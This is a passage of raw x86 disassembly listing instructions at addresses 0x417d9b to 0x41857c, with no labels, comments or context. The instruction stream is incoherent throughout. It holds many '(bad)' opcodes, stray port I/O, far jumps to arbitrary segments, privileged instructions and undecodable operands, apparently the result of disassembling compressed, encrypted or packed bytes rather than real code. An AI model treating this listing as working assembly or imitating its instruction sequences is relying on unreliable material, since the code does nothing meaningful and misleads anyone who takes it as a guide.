  417d9b:	addr16 pop es
  417d9d:	sbb    al,0x47
  417d9f:	dec    esi
  417da0:	stos   DWORD PTR es:[edi],eax
  417da1:	sub    BYTE PTR [edx],dh
  417da3:	mov    esp,fs
  417da5:	cld    
  417da6:	mov    ds:0xfed49e7b,al
  417dab:	mov    edx,0x885671b9
  417db0:	jno    0x417e01
  417db2:	mov    ah,BYTE PTR [ebx]
  417db4:	adc    dl,BYTE PTR [ebx-0x4a]
  417db7:	pushf  
  417db8:	leave  
  417db9:	push   cs
  417dba:	mov    ch,0xd7
  417dbc:	lds    esi,FWORD PTR [esi+0x11]
  417dbf:	and    eax,0xb9da3e33
  417dc4:	sbb    DWORD PTR [edi-0x1e9d3620],eax
  417dca:	push   ss
  417dcb:	or     esp,DWORD PTR gs:[edi-0x31e938bd]
  417dd2:	outs   dx,BYTE PTR ds:[esi]
  417dd3:	enter  0xbe37,0xa8
  417dd7:	test   bl,dh
  417dd9:	cmp    eax,DWORD PTR cs:[eax+eax*8-0x73073fff]
  417de1:	xor    al,0xe
  417de3:	lods   eax,DWORD PTR ds:[esi]
  417de4:	sub    cl,0x84
  417de7:	cld    
  417de8:	mov    esi,0x7ec5baa6
  417ded:	popa   
  417dee:	inc    edx
  417def:	mov    ecx,DWORD PTR [ebx-0x77]
  417df2:	pop    ebx
  417df3:	mov    esi,0x76cd563e
  417df8:	inc    edx
  417df9:	dec    ecx
  417dfa:	jge    0x417e18
  417dfc:	pop    eax
  417dfd:	popf   
  417dfe:	mov    ss:0x34db35f3,eax
  417e04:	bound  ebp,QWORD PTR [ebp+0x37]
  417e07:	sub    al,0xca
  417e09:	out    dx,al
  417e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e0b:	xchg   ebp,eax
  417e0c:	in     eax,dx
  417e0d:	cs push esp
  417e0f:	add    DWORD PTR [eax-0x30],0xffffff98
  417e13:	pushf  
  417e14:	mov    ecx,fs
  417e16:	or     BYTE PTR [ecx],0x8c
  417e19:	push   0xffffff90
  417e1b:	xchg   ebp,eax
  417e1c:	int3   
  417e1d:	mov    ebp,0x39cd5aeb
  417e22:	pop    eax
  417e23:	pop    ebx
  417e24:	jae    0x417de3
  417e26:	xchg   BYTE PTR [esi-0x35],cl
  417e29:	jmp    0x43bd:0x11fa4e30
  417e30:	push   cs
  417e31:	add    al,0x7
  417e33:	sbb    eax,0x2d219899
  417e38:	test   al,0x3c
  417e3a:	sub    bh,dl
  417e3c:	add    dl,bh
  417e3e:	sub    bh,dl
  417e40:	xor    eax,0x3230012f
  417e45:	and    bh,cl
  417e47:	(bad)  
  417e48:	fsub   st(5),st
  417e4a:	mov    eax,ds:0x3514d774
  417e4f:	sub    dl,cl
  417e51:	fistp  WORD PTR [ecx-0x6e15dd68]
  417e57:	lods   eax,DWORD PTR ds:[esi]
  417e58:	pop    ss
  417e59:	ja     0x417ebc
  417e5b:	outs   dx,DWORD PTR ds:[esi]
  417e5c:	in     al,dx
  417e5d:	sahf   
  417e5e:	push   ebp
  417e5f:	sbb    BYTE PTR [edi-0x1a7ec0f0],ch
  417e65:	rcr    ah,0x87
  417e68:	xor    BYTE PTR [eax+0x14],bl
  417e6b:	sub    BYTE PTR [ecx*1-0x1bd1eeab],ah
  417e72:	ss out dx,al
  417e74:	cmp    edi,DWORD PTR [ecx]
  417e76:	jnp    0x417e2f
  417e78:	mov    edx,0x946da92c
  417e7d:	push   0x7504d8aa
  417e82:	xor    eax,0xa13436dc
  417e87:	mov    ebx,0xd91696dd
  417e8c:	xchg   BYTE PTR [esi+eiz*2+0x6a5a14bb],al
  417e93:	mov    ecx,0xcd23149f
  417e98:	ds dec edi
  417e9a:	ror    DWORD PTR [edx],1
  417e9c:	je     0x417e56
  417e9e:	stos   DWORD PTR es:[edi],eax
  417e9f:	cwde   
  417ea0:	scas   eax,DWORD PTR es:[edi]
  417ea1:	fmul   DWORD PTR [ecx]
  417ea3:	aaa    
  417ea4:	shl    bl,1
  417ea6:	mov    edi,DWORD PTR [esi]
  417ea8:	shr    BYTE PTR [edi-0x4da7790d],cl
  417eae:	lods   al,BYTE PTR ds:[esi]
  417eaf:	fimul  WORD PTR [eax+0x350cd364]
  417eb5:	mov    cl,0x14
  417eb7:	sahf   
  417eb8:	(bad)  
  417eb9:	out    dx,eax
  417eba:	sub    DWORD PTR [esi*8+0x341b5bc4],0xffffff82
  417ec2:	gs cwde 
  417ec4:	js     0x417ef4
  417ec6:	xor    BYTE PTR [eax+0x73e5ab8],0xb7
  417ecd:	mov    dh,0xd8
  417ecf:	std    
  417ed0:	push   es
  417ed1:	scas   eax,DWORD PTR es:[edi]
  417ed2:	sar    BYTE PTR [eax+0x5b],0x31
  417ed6:	gs cmc 
  417ed8:	sbb    ecx,ecx
  417eda:	adc    al,BYTE PTR [edx+0x28a91d90]
  417ee0:	lock loopne 0x417f41
  417ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ee4:	sub    bl,bh
  417ee6:	cdq    
  417ee7:	sti    
  417ee8:	mov    edi,0x681f7b7f
  417eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eee:	js     0x417e75
  417ef0:	imul   esi,DWORD PTR [edx+0x3f],0xffffffdb
  417ef4:	inc    ebp
  417ef5:	cwde   
  417ef6:	(bad)  
  417ef7:	mov    eax,0xe0825ebd
  417efc:	adc    eax,DWORD PTR [ebx+0x5cdf5312]
  417f02:	in     al,dx
  417f03:	ror    DWORD PTR [edi],1
  417f05:	jg     0x417f4f
  417f07:	(bad)  
  417f08:	jmp    0x417f86
  417f0a:	dec    esp
  417f0b:	mov    esp,0xd33ead5a
  417f10:	fld    DWORD PTR ds:0xb0f3ab57
  417f17:	jnp    0x417f7a
  417f19:	pushf  
  417f1a:	sbb    bl,0xde
  417f1d:	xor    BYTE PTR [esi-0x80],al
  417f20:	dec    ebp
  417f21:	jmp    0xbb62:0x8d3c98e7
  417f28:	dec    ebp
  417f29:	pop    ebp
  417f2a:	push   eax
  417f2b:	idiv   dl
  417f2d:	and    dl,BYTE PTR [edx]
  417f2f:	mov    ebp,0xd18f97c3
  417f34:	jns    0x417eeb
  417f36:	xchg   esi,eax
  417f37:	push   esi
  417f38:	nop
  417f39:	inc    esp
  417f3a:	cmp    bl,BYTE PTR [ebx]
  417f3c:	mov    edi,0xb279f953
  417f41:	adc    ch,BYTE PTR [edi+0x6bfb446a]
  417f47:	pop    ecx
  417f48:	repnz shl DWORD PTR [eax],cl
  417f4b:	gs sti 
  417f4d:	xchg   ebx,eax
  417f4e:	xchg   ebp,eax
  417f4f:	out    dx,eax
  417f50:	les    esp,FWORD PTR [ecx+0x4a]
  417f53:	jmp    0x7eaf:0x12344fee
  417f5a:	lock cmp BYTE PTR [esp+ebp*2+0x58],0x73
  417f60:	sti    
  417f61:	pusha  
  417f62:	imul   BYTE PTR [ecx]
  417f64:	ret    
  417f65:	sbb    esi,DWORD PTR [edi]
  417f67:	push   ebp
  417f68:	mov    eax,0x7e0aa376
  417f6d:	fstp   DWORD PTR [ebx+0x6e]
  417f70:	push   ebp
  417f71:	xchg   BYTE PTR [esi],dl
  417f73:	inc    esp
  417f74:	js     0x417f01
  417f76:	btr    DWORD PTR [eax-0x74409b98],ebx
  417f7d:	cmp    eax,0xabf2ac95
  417f82:	fucom  st(7)
  417f84:	push   es
  417f85:	call   0xc735:0xa14948e8
  417f8c:	test   al,0xf7
  417f8e:	inc    edi
  417f8f:	js     0x417ffc
  417f91:	adc    ah,bl
  417f93:	and    al,0xc4
  417f95:	dec    ecx
  417f96:	jns    0x417ff8
  417f98:	into   
  417f99:	leave  
  417f9a:	mul    bh
  417f9c:	aaa    
  417f9d:	fadd   st(7),st
  417f9f:	ret    0x1c95
  417fa2:	dec    ecx
  417fa3:	fs cmp eax,0xf42e52d6
  417fa9:	data16 mov dh,0xb3
  417fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fad:	les    edx,FWORD PTR [ebx]
  417faf:	std    
  417fb0:	ficom  DWORD PTR [ecx+ebp*8]
  417fb3:	sar    DWORD PTR [eax+0x65cddfd9],1
  417fb9:	add    ecx,DWORD PTR [ebx]
  417fbb:	pop    es
  417fbc:	push   es
  417fbd:	popa   
  417fbe:	sub    al,BYTE PTR [edx+ecx*8+0x42]
  417fc2:	adc    al,dl
  417fc4:	fadd   QWORD PTR [ecx+0x19]
  417fc7:	pop    ebp
  417fc8:	adc    DWORD PTR [eax-0x1241e366],esp
  417fce:	dec    ebp
  417fcf:	pusha  
  417fd0:	push   ds
  417fd1:	push   0x1f
  417fd3:	jns    0x41803d
  417fd5:	aad    0xa3
  417fd7:	sbb    DWORD PTR [edx],0xfffffffb
  417fda:	jo     0x41804a
  417fdc:	pop    esi
  417fdd:	mov    esi,0x716ad79c
  417fe2:	jp     0x417ff3
  417fe4:	add    BYTE PTR [ebp+0x19],dh
  417fe7:	add    al,0xb7
  417fe9:	test   al,0xcd
  417feb:	lods   al,BYTE PTR ds:[esi]
  417fec:	adc    al,0x2f
  417fee:	or     eax,0xd56a43d
  417ff3:	cmp    cl,BYTE PTR [ecx]
  417ff5:	sub    DWORD PTR [edx+0x7ceb09f4],esp
  417ffb:	sar    ah,0x16
  417ffe:	(bad)  
  417fff:	fwait
  418000:	retf   0x1a4
  418003:	mov    edi,0xa5c525bb
  418008:	adc    al,0x1a
  41800a:	xor    eax,0xfaad61e9
  41800f:	sub    ebx,0xd2d5ec02
  418015:	sbb    ecx,ebx
  418017:	std    
  418018:	(bad)  
  418019:	in     eax,dx
  41801a:	out    0x79,al
  41801c:	sbb    ch,BYTE PTR [ebp-0x24]
  41801f:	sub    al,0xc3
  418021:	(bad)  
  418022:	hlt    
  418023:	in     al,0xf6
  418025:	mov    dh,0x22
  418027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418028:	in     eax,0xea
  41802a:	push   0x53
  41802c:	pop    eax
  41802d:	mov    dh,0xbd
  41802f:	and    bh,BYTE PTR ds:0x603d4831
  418035:	shl    DWORD PTR [esp+eax*4-0x18],0x7e
  41803a:	lods   eax,DWORD PTR ds:[esi]
  41803b:	push   esi
  41803c:	mov    cl,0xa5
  41803e:	pop    ebp
  41803f:	rep ins BYTE PTR es:[edi],dx
  418041:	mov    WORD PTR [edx+0x7d070b01],gs
  418047:	push   ds
  418048:	pop    eax
  418049:	cmp    BYTE PTR [eax],dl
  41804b:	ret    
  41804c:	mov    al,0x7c
  41804e:	mov    eax,0x7c9d1deb
  418053:	(bad)  
  418054:	jb     0x41809a
  418056:	mov    DWORD PTR [edi+0x4596fe1e],ecx
  41805c:	int3   
  41805d:	js     0x41808f
  41805f:	ins    BYTE PTR es:[edi],dx
  418060:	xchg   ebx,eax
  418061:	pop    esi
  418062:	mov    bl,0x2f
  418064:	fild   WORD PTR [ebx-0x5c]
  418067:	jp     0x4180bc
  418069:	mov    ah,0x1d
  41806b:	jne    0x418053
  41806d:	xchg   ebx,eax
  41806e:	sti    
  41806f:	push   esp
  418070:	retf   
  418071:	pop    edx
  418072:	pop    eax
  418073:	or     DWORD PTR ds:0xfb732502,edx
  418079:	loopne 0x418042
  41807b:	jmp    FWORD PTR [ebx-0x6]
  41807e:	pop    ss
  41807f:	adc    al,0xcf
  418081:	icebp  
  418082:	jns    0x418030
  418084:	lds    esp,FWORD PTR [esi+0x5f]
  418087:	sbb    eax,0x224030ca
  41808c:	test   eax,0x560d7f1a
  418091:	lds    eax,FWORD PTR [ebp+0x7c]
  418094:	pushf  
  418095:	out    0xc1,eax
  418097:	stos   BYTE PTR es:[edi],al
  418098:	add    eax,0xd558e783
  41809d:	es jge 0x41806b
  4180a0:	(bad)  
  4180a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a2:	pop    ebx
  4180a3:	shl    DWORD PTR [edi+eax*4-0x20dacb3e],cl
  4180aa:	pop    edx
  4180ab:	adc    BYTE PTR [ecx],al
  4180ad:	int    0x28
  4180af:	sahf   
  4180b0:	shl    dl,0xf9
  4180b3:	adc    DWORD PTR [eax],ebx
  4180b5:	adc    BYTE PTR [esi-0x3bc874ba],bl
  4180bb:	mov    cl,0x8f
  4180bd:	xor    bh,BYTE PTR [ebp+0x4e]
  4180c0:	mov    ah,0xf4
  4180c2:	arpl   WORD PTR [esi+0x15],bp
  4180c5:	cmp    ecx,DWORD PTR [ecx+esi*4-0x7a]
  4180c9:	stc    
  4180ca:	cdq    
  4180cb:	xor    DWORD PTR [esi+0x7b],esi
  4180ce:	pop    ecx
  4180cf:	mov    ch,0xb7
  4180d1:	xchg   BYTE PTR [ebp+0x3b],al
  4180d4:	jle    0x4180bf
  4180d6:	push   esi
  4180d7:	repz mov cs,WORD PTR [edx-0x2a]
  4180db:	std    
  4180dc:	adc    BYTE PTR ds:0xb6e4531c,al
  4180e2:	xor    ah,BYTE PTR [edi+edi*2+0x14]
  4180e6:	adc    BYTE PTR [edi+0x56],dl
  4180e9:	sbb    DWORD PTR [esi+0x75267998],0x7de74f5
  4180f3:	enter  0x9341,0x51
  4180f7:	ret    0xe81b
  4180fa:	mov    ecx,0x9a6e021e
  4180ff:	or     BYTE PTR [esi+0xb784a75],ch
  418105:	mov    al,ds:0x5ad879ef
  41810a:	mul    DWORD PTR ds:0xf435f05a
  418110:	push   eax
  418111:	xchg   edx,eax
  418112:	push   es
  418113:	popf   
  418114:	(bad)  [ebx-0x1b]
  418117:	mov    ah,0xd6
  418119:	jp     0x418122
  41811b:	or     BYTE PTR [ecx-0x2df8f4d4],0x7f
  418122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418123:	push   ecx
  418124:	mov    eax,ds:0x24fd9ffb
  418129:	or     bl,ah
  41812b:	adc    eax,0x8d2267cb
  418130:	pop    edx
  418131:	lahf   
  418132:	imul   ebx,DWORD PTR [esi+0x2],0xffffffa1
  418136:	and    DWORD PTR [ebp-0x12],ebp
  418139:	adc    bl,BYTE PTR [ebx-0x49a8dc64]
  41813f:	sub    dh,ah
  418141:	int    0x7c
  418143:	push   cs
  418144:	xchg   edi,eax
  418145:	retf   0x9f
  418148:	int3   
  418149:	jnp    0x418170
  41814b:	mov    ds:0x3eb5954,eax
  418150:	inc    esp
  418151:	ins    BYTE PTR es:[edi],dx
  418152:	test   BYTE PTR [edi],ch
  418154:	loop   0x418153
  418156:	push   0xec1cacb6
  41815b:	lods   al,BYTE PTR ds:[esi]
  41815c:	mov    ah,0x52
  41815e:	push   0x15b4c22c
  418163:	out    0xa0,eax
  418165:	nop
  418166:	pop    ecx
  418167:	scas   al,BYTE PTR es:[edi]
  418168:	mov    dh,0xbf
  41816a:	and    eax,0xb5fdad41
  41816f:	repz (bad) 
  418171:	mov    ebp,0xd1ac0224
  418176:	in     eax,dx
  418177:	jmp    0x418108
  418179:	and    al,BYTE PTR [ebp-0x1]
  41817c:	repnz sbb ch,BYTE PTR [eax+0x66]
  418180:	test   al,0xfd
  418182:	test   DWORD PTR [ebp+0x5d],edx
  418185:	cmp    DWORD PTR [edx],edi
  418187:	mov    ds:0xb1a9edc5,al
  41818c:	push   edi
  41818d:	mov    bl,0x71
  41818f:	add    eax,0xaf025b1a
  418194:	sar    ah,1
  418196:	daa    
  418197:	lods   eax,DWORD PTR ds:[si]
  418199:	push   edx
  41819a:	jo     0x41820d
  41819c:	std    
  41819d:	sbb    eax,0x72830f1d
  4181a2:	mov    ds:0x9e494f1f,eax
  4181a7:	rcr    BYTE PTR ds:0x72e41290,cl
  4181ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181ae:	iret   
  4181af:	mov    edi,0x5b035f53
  4181b4:	mov    bh,0xdc
  4181b6:	repnz aam 0xcc
  4181b9:	push   ebx
  4181ba:	lahf   
  4181bb:	call   0xcb0315c4
  4181c0:	mov    DWORD PTR [edi-0x70],esi
  4181c3:	xchg   edx,eax
  4181c4:	inc    ebp
  4181c5:	fcompp 
  4181c7:	jmp    0x4181ce
  4181c9:	lea    ebx,[ebx+eax*2]
  4181cc:	jecxz  0x418244
  4181ce:	out    0xf5,eax
  4181d0:	aad    0x3c
  4181d2:	jl     0x41820b
  4181d4:	pop    esp
  4181d5:	pushf  
  4181d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181d7:	fst    QWORD PTR [esi]
  4181d9:	lahf   
  4181da:	pusha  
  4181db:	sub    bl,BYTE PTR [esi]
  4181dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181de:	enter  0xefcc,0x38
  4181e2:	adc    DWORD PTR [edi+0x42],0x9b14aa0
  4181e9:	inc    eax
  4181ea:	mov    dh,0xe2
  4181ec:	and    DWORD PTR [esi+0x1421ca6],edi
  4181f2:	ror    DWORD PTR [eax-0x7402b733],cl
  4181f8:	xor    al,0xb6
  4181fa:	add    eax,0xb09e427d
  4181ff:	inc    esp
  418200:	test   al,0x91
  418202:	sbb    eax,0x3461fed
  418207:	inc    edi
  418208:	push   ebp
  418209:	jmp    0x9861795a
  41820e:	cmp    al,0xf8
  418210:	imul   ebp,DWORD PTR [ebx-0x42161790],0xffffff9c
  418217:	jo     0x4181cd
  418219:	sti    
  41821a:	mov    ds:0x6c362280,eax
  41821f:	mov    esi,0x9b1454c3
  418224:	sbb    edx,DWORD PTR [esi-0x1f]
  418227:	dec    esp
  418228:	gs test eax,0x3106fe62
  41822e:	outs   dx,DWORD PTR ds:[esi]
  41822f:	xchg   esi,eax
  418230:	das    
  418231:	push   cs
  418232:	gs ins BYTE PTR es:[edi],dx
  418234:	(bad)  [edx+eiz*8+0x65]
  418238:	pop    esp
  418239:	out    0xcd,eax
  41823b:	add    ebp,esi
  41823d:	dec    edi
  41823e:	xor    eax,0x5edef290
  418243:	scas   eax,DWORD PTR es:[edi]
  418244:	sub    al,0xba
  418246:	jmp    0xa8419418
  41824b:	ficom  DWORD PTR [ecx]
  41824d:	cwde   
  41824e:	je     0x4181d3
  418250:	sub    eax,0xf92075d3
  418255:	test   BYTE PTR [esi+0x1ddc0f6b],bh
  41825b:	aaa    
  41825c:	cmovae ecx,DWORD PTR [ecx+0x26]
  418260:	xchg   ecx,eax
  418261:	shr    BYTE PTR [edi-0x55],0x8c
  418265:	nop
  418266:	outs   dx,DWORD PTR ds:[esi]
  418267:	xor    BYTE PTR [edx],bl
  418269:	ret    0x6fee
  41826c:	jecxz  0x418244
  41826e:	add    al,0x2e
  418270:	dec    ecx
  418271:	cs pop edi
  418273:	xchg   edx,eax
  418274:	cwde   
  418275:	dec    esi
  418276:	popf   
  418277:	mov    ah,0x31
  418279:	loope  0x4182dc
  41827b:	and    DWORD PTR [edx-0x2c9b95a1],esp
  418281:	enter  0x6355,0x80
  418285:	in     eax,0x89
  418287:	loop   0x418288
  418289:	arpl   WORD PTR [edx+0x5a54427f],bp
  41828f:	push   esp
  418290:	jl     0x4182a0
  418292:	push   es
  418293:	jecxz  0x4182da
  418295:	dec    edx
  418296:	out    0xc3,al
  418298:	ret    
  418299:	fild   DWORD PTR [eax+0xb]
  41829c:	call   0x95d44c61
  4182a1:	push   edi
  4182a2:	stos   DWORD PTR es:[edi],eax
  4182a3:	in     eax,0x43
  4182a5:	das    
  4182a6:	pop    edi
  4182a7:	jns    0x4182d5
  4182a9:	dec    esp
  4182aa:	loopne 0x4182d7
  4182ac:	push   ss
  4182ad:	pop    ecx
  4182ae:	cmp    ebx,ecx
  4182b0:	aaa    
  4182b1:	nop
  4182b2:	scas   al,BYTE PTR es:[edi]
  4182b3:	int    0x2c
  4182b5:	or     al,0x4a
  4182b7:	es out dx,eax
  4182b9:	repnz lea edi,[ecx+edi*4-0x76d1c944]
  4182c1:	popa   
  4182c2:	out    0xd2,eax
  4182c4:	fcomp  DWORD PTR ds:0x7dc881bb
  4182ca:	stos   BYTE PTR es:[edi],al
  4182cb:	das    
  4182cc:	aaa    
  4182cd:	mov    ebx,0x2ef4ed23
  4182d2:	sub    ebx,edi
  4182d4:	test   DWORD PTR [edi+0x36],edx
  4182d7:	repnz inc esp
  4182d9:	cmp    edx,DWORD PTR [esi+0x3ce89c2c]
  4182df:	imul   esp,edi,0xc838cef
  4182e5:	xor    BYTE PTR [eax],ah
  4182e7:	inc    ecx
  4182e8:	push   ss
  4182e9:	mov    WORD PTR [edi+0x4c],?
  4182ec:	out    dx,al
  4182ed:	lods   eax,DWORD PTR ds:[esi]
  4182ee:	jae    0x418364
  4182f0:	xchg   edx,eax
  4182f1:	rol    edi,cl
  4182f3:	scas   eax,DWORD PTR es:[edi]
  4182f4:	mov    DWORD PTR [esi-0x71703deb],eax
  4182fa:	pusha  
  4182fb:	clc    
  4182fc:	loopne 0x418365
  4182fe:	dec    ecx
  4182ff:	enter  0x541,0x9b
  418303:	mov    al,ds:0x781d6d06
  418308:	xor    eax,0x487a4db0
  41830d:	add    ah,0xb5
  418310:	add    al,ch
  418312:	addr16 pop es
  418314:	xchg   esi,eax
  418315:	fist   DWORD PTR [eax]
  418317:	shl    ah,1
  418319:	or     ebx,ebx
  41831b:	mov    fs,edi
  41831d:	out    0x85,eax
  41831f:	jecxz  0x418340
  418321:	xchg   ebp,eax
  418322:	add    eax,0x1449e9a9
  418327:	inc    eax
  418328:	push   ebx
  418329:	int3   
  41832a:	jecxz  0x418348
  41832c:	dec    esi
  41832d:	in     al,0x65
  41832f:	jno    0x418339
  418331:	or     ch,BYTE PTR [eax+0x4f]
  418334:	iret   
  418335:	aad    0xe6
  418337:	pop    esi
  418338:	inc    esp
  418339:	adc    eax,0x1de28adc
  41833e:	lods   al,BYTE PTR ds:[esi]
  41833f:	pushf  
  418340:	mov    cl,0x56
  418342:	and    eax,0x549ea4b7
  418347:	sub    DWORD PTR [eax-0x1b95c1b3],edi
  41834d:	retf   
  41834e:	js     0x418397
  418350:	lea    ebp,[ebx+0x54]
  418353:	aas    
  418354:	js     0x418375
  418356:	add    al,0xc2
  418358:	mov    ah,0x50
  41835a:	inc    ebx
  41835b:	mov    bh,0xe7
  41835d:	add    DWORD PTR [edi-0x208be164],0xd18d0478
  418367:	pop    ds
  418368:	mov    cl,0xd
  41836a:	out    0x83,eax
  41836c:	inc    esi
  41836d:	mov    ebx,0xda59ef14
  418372:	jp     0x418394
  418374:	repz mov edi,0x5dd11a30
  41837a:	mov    esi,0xb2081b6e
  41837f:	sbb    ebp,DWORD PTR [edx]
  418381:	dec    edx
  418382:	cmp    ecx,esi
  418384:	sub    al,0x6a
  418386:	xor    ch,BYTE PTR [ebx-0x3e]
  418389:	or     BYTE PTR [esi],al
  41838b:	xchg   BYTE PTR [eax],cl
  41838d:	push   ecx
  41838e:	and    DWORD PTR [esi-0x2bffc8bd],0xffffffbf
  418395:	or     DWORD PTR [edi],ebp
  418397:	in     al,dx
  418398:	dec    esi
  418399:	mov    WORD PTR [esi],fs
  41839b:	xchg   edx,eax
  41839c:	inc    ecx
  41839d:	cmp    BYTE PTR [ebx+0x3e030de8],bh
  4183a3:	sbb    ecx,eax
  4183a5:	cmp    DWORD PTR [ebx+edx*8],0x443a167e
  4183ac:	cmp    eax,0x291fc99a
  4183b1:	aaa    
  4183b2:	adc    BYTE PTR [ebx],bl
  4183b4:	js     0x418384
  4183b6:	aas    
  4183b7:	sbb    eax,0xfff79b92
  4183bc:	out    dx,al
  4183bd:	or     DWORD PTR [esi+eiz*2],ebp
  4183c0:	sbb    eax,0x178ee88d
  4183c5:	mov    ds:0x722cfb68,eax
  4183ca:	cmc    
  4183cb:	add    al,0x2f
  4183cd:	pop    edi
  4183ce:	sub    ch,bl
  4183d0:	mov    eax,ds:0x178d4632
  4183d5:	gs je  0x4183da
  4183d8:	repnz (bad) [edi+0x283f59d2]
  4183df:	inc    edx
  4183e0:	std    
  4183e1:	sbb    ebx,edx
  4183e3:	lods   al,BYTE PTR ds:[esi]
  4183e4:	outs   dx,DWORD PTR ds:[esi]
  4183e5:	retf   0xfcd7
  4183e8:	inc    BYTE PTR [edi-0xc64da1]
  4183ee:	mov    bh,0x4c
  4183f0:	mov    edx,0x72a4916c
  4183f5:	jne    0x41844a
  4183f7:	or     BYTE PTR [ecx],dl
  4183f9:	shl    DWORD PTR [eax],0xda
  4183fc:	loop   0x4183c0
  4183fe:	pop    ebp
  4183ff:	(bad)  
  418400:	mov    ah,0xb6
  418402:	scas   al,BYTE PTR es:[edi]
  418403:	dec    eax
  418404:	mov    ebx,DWORD PTR [eax+0x1c]
  418407:	or     eax,0x9b5e982d
  41840c:	(bad)  
  41840d:	inc    eax
  41840e:	test   DWORD PTR [edx+eax*4-0x268d29e7],eax
  418415:	sub    al,0x68
  418417:	lea    eax,[ebp+0x4e566870]
  41841d:	or     BYTE PTR [ecx],cl
  41841f:	pushf  
  418420:	pop    ss
  418421:	imul   esp,DWORD PTR [ebx-0x37fa51bc],0xca120df5
  41842b:	cwde   
  41842c:	xor    al,0xb4
  41842e:	inc    ecx
  41842f:	sbb    DWORD PTR [edx+0x70af80e1],esp
  418435:	jmp    0xe6b0:0x665b55ff
  41843c:	scas   al,BYTE PTR es:[edi]
  41843d:	mov    ebx,ebp
  41843f:	nop    DWORD PTR [esi+0x73]
  418443:	pop    edi
  418444:	mov    esp,DWORD PTR [edx+edi*4+0x5b]
  418448:	mov    ah,0x5e
  41844a:	clc    
  41844b:	rcr    DWORD PTR [ecx],0x82
  41844e:	aad    0xdb
  418450:	sbb    DWORD PTR [edi*1-0x1b24ec7c],esi
  418457:	add    DWORD PTR [ebx],eax
  418459:	mov    gs,WORD PTR [edx+ecx*4+0xecdca8a]
  418460:	sar    BYTE PTR [esi-0x5fff119a],0xc1
  418467:	or     BYTE PTR [ebp-0x726c3c21],0x54
  41846e:	mov    ecx,0x74414367
  418473:	inc    edx
  418474:	call   0x66508374
  418479:	xchg   esi,eax
  41847a:	and    DWORD PTR [esi],edx
  41847c:	pop    es
  41847d:	push   esp
  41847e:	adc    ecx,DWORD PTR [ebx-0x65a70514]
  418484:	mov    ds:0xc6f75210,eax
  418489:	adc    al,bh
  41848b:	shr    BYTE PTR ds:0xe7cc52bf,0x73
  418492:	mov    al,0x2b
  418494:	mov    WORD PTR [ecx],?
  418496:	mov    bh,0xd6
  418498:	sti    
  418499:	out    0xf8,eax
  41849b:	sub    eax,0xf8912074
  4184a0:	dec    edi
  4184a1:	dec    eax
  4184a2:	mov    ebx,0xda9e763d
  4184a7:	push   edi
  4184a8:	dec    eax
  4184a9:	pop    edi
  4184aa:	add    ebx,ecx
  4184ac:	inc    edi
  4184ad:	inc    ecx
  4184af:	pop    esi
  4184b0:	mov    ah,0x9e
  4184b2:	repnz pusha 
  4184b4:	sbb    al,0xb6
  4184b6:	mov    WORD PTR [ecx],?
  4184b8:	mov    dl,0xd2
  4184ba:	scas   al,BYTE PTR es:[edi]
  4184bb:	dec    eax
  4184bc:	dec    ebx
  4184bd:	stos   DWORD PTR es:[edi],eax
  4184be:	pop    ecx
  4184bf:	cmp    BYTE PTR [edx],cl
  4184c1:	cld    
  4184c2:	adc    ebx,DWORD PTR [edx+0x3d4636a1]
  4184c8:	dec    esi
  4184c9:	sub    edi,ecx
  4184cb:	inc    ebx
  4184cc:	inc    sp
  4184ce:	mov    ecx,0x67b22357
  4184d3:	cmc    
  4184d4:	ds xor eax,0x31b0748c
  4184da:	jbe    0x41853e
  4184dc:	in     al,0x11
  4184de:	int    0x51
  4184e0:	scas   eax,DWORD PTR es:[edi]
  4184e1:	xchg   ecx,eax
  4184e2:	arpl   WORD PTR [edx-0x5a8a6d26],cx
  4184e8:	pop    eax
  4184e9:	mov    al,0x2c
  4184eb:	add    BYTE PTR [eax+0x14],ah
  4184ee:	jnp    0x418558
  4184f0:	ret    
  4184f1:	dec    ebp
  4184f2:	out    0x86,al
  4184f4:	das    
  4184f5:	push   eax
  4184f6:	mov    al,0x35
  4184f8:	ret    0x1a4
  4184fb:	retf   
  4184fc:	cmp    dh,ah
  4184fe:	jmp    0x418515
  418500:	dec    eax
  418501:	js     0x41849a
  418503:	repz inc edi
  418505:	xchg   edi,eax
  418506:	rol    BYTE PTR [esi-0x3a19da5],0x7
  41850d:	loope  0x41848f
  41850f:	pop    esi
  418510:	sub    eax,0xfcaf5a61
  418515:	out    dx,eax
  418516:	mov    BYTE PTR [bp+0x2d],ch
  41851a:	pop    esp
  41851b:	dec    esp
  41851c:	inc    esp
  41851d:	loopne 0x418570
  41851f:	vmulpd ymm3,ymm6,YMMWORD PTR [edi-0xa7118e5]
  418527:	and    DWORD PTR [eax],ecx
  418529:	cmp    al,0x82
  41852b:	add    DWORD PTR [ebx-0x40ae1dc9],0xab334185
  418535:	or     BYTE PTR [edx-0x2],ch
  418538:	inc    ecx
  418539:	sbb    al,0x99
  41853b:	fwait
  41853c:	inc    edi
  41853d:	mov    ebp,0x49d243d4
  418542:	lds    ebx,FWORD PTR [ebx]
  418544:	mov    edi,DWORD PTR [edx]
  418546:	push   ecx
  418547:	dec    ecx
  418548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418549:	in     eax,dx
  41854a:	pop    ss
  41854b:	cmc    
  41854c:	mov    BYTE PTR ss:[ebx+0x5330b34],bh
  418553:	rol    DWORD PTR [edi+0x4c],0x23
  418557:	cmp    eax,DWORD PTR [eax+0x4646e4e3]
  41855d:	sti    
  41855e:	xchg   DWORD PTR [edi+0x22640202],esi
  418564:	in     eax,0x81
  418566:	and    BYTE PTR [esi],bh
  418568:	cmp    al,0xea
  41856a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856b:	sbb    DWORD PTR ds:0x4a310a22,ebp
  418571:	mov    cl,0x3
  418573:	mov    ebp,0x53655b3d
  418578:	sar    dl,0xd8
  41857b:	ret    
  41857c:	and    al,0xd4
